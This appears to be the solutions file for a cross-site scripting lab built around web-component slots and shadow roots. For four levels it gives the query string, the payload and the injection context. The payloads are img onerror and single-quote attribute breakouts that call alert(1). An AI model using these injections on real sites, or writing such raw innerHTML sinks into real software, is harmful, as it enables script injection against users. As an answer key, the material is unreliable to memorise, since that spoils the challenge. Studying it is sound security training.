# slot — solutions

Web-component `<slot>` reflections — light DOM text/attribute interpolation that ends up rendered inside the shadow root.

### slot-level1

`/slot/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: light DOM `<x-card>` content slotted into shadow root

### slot-level2

`/slot/level2/?query=a'%20onload=alert(1)%20x='`

- payload: `a' onload=alert(1) x='`
- context: reflected inside `<span slot='...'>`; single-quote breakout

### slot-level3

`/slot/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: slot light DOM serialized then innerHTML'd in shadow

### slot-level4

`/slot/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `query.to_json` JSON-escapes the value, so there is no *JS-string*
  breakout — but the string still reaches `shadowRoot.innerHTML` as raw HTML,
  and event handlers fire inside a shadow root. Verified in Chrome 150.
  (This entry previously claimed the level was protected; it is not.)
